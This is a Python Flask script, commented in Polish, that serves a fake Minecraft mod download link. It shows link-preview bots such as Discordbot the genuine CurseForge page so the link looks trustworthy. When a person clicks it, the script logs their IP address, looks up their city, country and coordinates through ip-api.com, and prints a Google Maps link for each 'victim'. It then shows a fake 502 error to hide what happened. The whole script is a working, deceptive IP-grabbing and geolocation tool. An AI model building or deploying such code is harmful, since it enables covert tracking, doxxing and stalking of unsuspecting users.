import requests
import sys
from flask import Flask, request, redirect

app = Flask(__name__)

# Oryginalny link do podglądu
ORIGINAL_MOD_LINK = "https://www.curseforge.com/minecraft/mc-mods/timeless-and-classics-zero/download/7401617"

@app.route('/cdn-download/7401617')
def logger():
    ua = request.headers.get('User-Agent', '')
    # Pobieranie IP (uwzględnia wielu użytkowników przez proxy Rendera)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # 1. CLOAKING - Dzięki temu wielu użytkowników widzi ładny podgląd moda
    if "Discordbot" in ua or "externalhit" in ua.lower():
        return redirect(ORIGINAL_MOD_LINK)

    # 2. LOGOWANIE KAŻDEGO KLIKNIĘCIA OSOBNO
    print(f"\n--- !!! NOWE TRAFIENIE (IP: {ip}) !!! ---", flush=True)
    
    try:
        # Pobieranie danych geograficznych
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country,isp", timeout=5).json()
        
        if r.get("status") == "success":
            lat, lon = r.get('lat'), r.get('lon')
            # Link do mapy Google, który prosiłeś, aby był w logach
            google_maps_url = f"https://www.google.com/maps?q={lat},{lon}"
            
            print(f"OFIARA Z MIASTA: {r.get('city')}, {r.get('country')}", flush=True)
            print(f"📍 MAPA GOOGLE: {google_maps_url}", flush=True)
        else:
            print(f"INFO: Kliknięcie z IP {ip}, ale nie udało się pobrać mapy.", flush=True)
            
    except Exception as e:
        print(f"Błąd przy tym użytkowniku: {e}", flush=True)

    print("------------------------------------------", flush=True)
    sys.stdout.flush()

    # 3. CO WIDZĄ WSZYSCY UŻYTKOWNICY
    return '<h1>502 Bad Gateway</h1><p>The server returned an invalid response from the upstream server.</p>', 502

if __name__ == '__main__':
    # Obsługa wielu połączeń jednocześnie
    app.run(host='0.0.0.0', port=10000, threaded=True)
